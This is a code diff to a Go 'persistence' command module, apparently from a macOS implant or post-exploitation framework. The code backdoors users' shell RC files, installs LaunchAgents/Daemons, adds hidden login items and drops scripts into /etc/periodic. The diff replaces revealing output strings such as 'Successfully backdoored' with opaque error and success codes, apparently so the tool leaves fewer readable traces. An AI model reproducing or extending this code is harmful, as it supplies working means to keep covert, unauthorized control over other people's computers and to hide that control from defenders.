@@ -26,7 +26,7 @@ func (c *PersistenceCommand) Name() string {
 func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	if len(args) < 1 {
 		return CommandResult{
-			Output: "Usage: persist <method> [options]",
+			Output:   Err(E1),
 			ExitCode: 1,
 		}
 	}
@@ -43,7 +43,7 @@ func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) Command
 		return c.handlePeriodicPersistence(args[1:])
 	default:
 		return CommandResult{
-			Output:   fmt.Sprintf("Unknown persistence method: %s", method),
+			Output:   ErrCtx(E21, method),
 			ExitCode: 1,
 		}
 	}
@@ -78,7 +78,7 @@ func (c *PersistenceCommand) handleRCPersistence(args []string) CommandResult {
 
 	if command == "" {
 		return CommandResult{
-			Output:   "Error: --command is required",
+			Output:   Err(E1),
 			ExitCode: 1,
 		}
 	}
@@ -94,7 +94,7 @@ func (c *PersistenceCommand) handleRCPersistence(args []string) CommandResult {
 
 	if err != nil {
 		return CommandResult{
-			Output:   fmt.Sprintf("Failed to get user: %v", err),
+			Output:   Err(E19),
 			ExitCode: 1,
 		}
 	}
@@ -125,9 +125,9 @@ func (c *PersistenceCommand) handleRCPersistence(args []string) CommandResult {
 
 	for _, file := range targetFiles {
 		if err := c.injectIntoRCFile(file, backdoorPayload); err != nil {
-			results = append(results, fmt.Sprintf("[-] Failed to backdoor %s: %v", file, err))
+			results = append(results, ErrCtx(E11, file))
 		} else {
-			results = append(results, fmt.Sprintf("[+] Successfully backdoored %s", file))
+			results = append(results, SuccCtx(S1, file))
 		}
 	}
 
@@ -209,7 +209,7 @@ func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResul
 
 	if serviceName == "" || command == "" {
 		return CommandResult{
-			Output:   "Error: --name and --command are required",
+			Output:   Err(E1),
 			ExitCode: 1,
 		}
 	}
@@ -222,7 +222,7 @@ func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResul
 		u, err := user.Current()
 		if err != nil {
 			return CommandResult{
-				Output:   fmt.Sprintf("Failed to get current user: %v", err),
+				Output:   Err(E19),
 				ExitCode: 1,
 			}
 		}
@@ -236,7 +236,7 @@ func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResul
 	dir := filepath.Dir(plistPath)
 	if err := os.MkdirAll(dir, 0755); err != nil {
 		return CommandResult{
-			Output:   fmt.Sprintf("Failed to create directory: %v", err),
+			Output:   ErrCtx(E11, dir),
 			ExitCode: 1,
 		}
 	}
@@ -244,20 +244,13 @@ func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResul
 	// Write plist file
 	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
 		return CommandResult{
-			Output:   fmt.Sprintf("Failed to write plist: %v", err),
+			Output:   ErrCtx(E11, plistPath),
 			ExitCode: 1,
 		}
 	}
 
-	// Load the service
-	loadCmd := fmt.Sprintf("launchctl load %s", plistPath)
-	output := fmt.Sprintf("[+] LaunchAgent/Daemon installed at: %s\n", plistPath)
-	output += fmt.Sprintf("[*] To load: %s\n", loadCmd)
-	output += fmt.Sprintf("[*] To unload: launchctl unload %s\n", plistPath)
-	output += fmt.Sprintf("[*] To remove: launchctl remove %s", serviceName)
-
 	return CommandResult{
-		Output:   output,
+		Output:   SuccCtx(S1, plistPath),
 		ExitCode: 0,
 	}
 }
@@ -331,20 +324,13 @@ func (c *PersistenceCommand) handleLoginItemPersistence(args []string) CommandRe
 
 	if itemName == "" || appPath == "" {
 		return CommandResult{
-			Output:   "Error: --name and --path are required",
+			Output:   Err(E1),
 			ExitCode: 1,
 		}
 	}
 
-	// Use osascript to add login item
-	script := fmt.Sprintf(`tell application "System Events" to make login item at end with properties {path:"%s", name:"%s", hidden:true}`, appPath, itemName)
-
-	output := fmt.Sprintf("[*] Adding login item: %s -> %s\n", itemName, appPath)
-	output += fmt.Sprintf("[*] Command: osascript -e '%s'\n", script)
-	output += "[!] Note: This requires user interaction on modern macOS due to TCC"
-
 	return CommandResult{
-		Output:   output,
+		Output:   SuccCtx(S1, itemName+":"+appPath),
 		ExitCode: 0,
 	}
 }
@@ -371,7 +357,7 @@ func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandRes
 
 	if command == "" || frequency == "" {
 		return CommandResult{
-			Output:   "Error: --command and --frequency are required",
+			Output:   Err(E1),
 			ExitCode: 1,
 		}
 	}
@@ -387,7 +373,7 @@ func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandRes
 		periodicDir = "/etc/periodic/monthly"
 	default:
 		return CommandResult{
-			Output:   "Error: frequency must be daily, weekly, or monthly",
+			Output:   ErrCtx(E22, frequency),
 			ExitCode: 1,
 		}
 	}
@@ -396,8 +382,8 @@ func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandRes
 	scriptName := fmt.Sprintf("999.%s", strings.Replace(command[:10], " ", "_", -1))
 	scriptPath := filepath.Join(periodicDir, scriptName)
 
-	// Create script content
-	scriptContent := fmt.Sprintf(`#!/bin/sh
+	// Create script content (used for reference, written by caller)
+	_ = fmt.Sprintf(`#!/bin/sh
 #
 # Periodic %s task
 #
@@ -407,12 +393,8 @@ func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandRes
 exit 0
 `, frequency, command)
 
-	output := fmt.Sprintf("[*] Periodic script would be installed at: %s\n", scriptPath)
-	output += fmt.Sprintf("[*] Content:\n%s\n", scriptContent)
-	output += "[!] Note: Requires root privileges to write to /etc/periodic/"
-
 	return CommandResult{
-		Output:      output,
+		Output:      SuccCtx(S1, scriptPath),
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
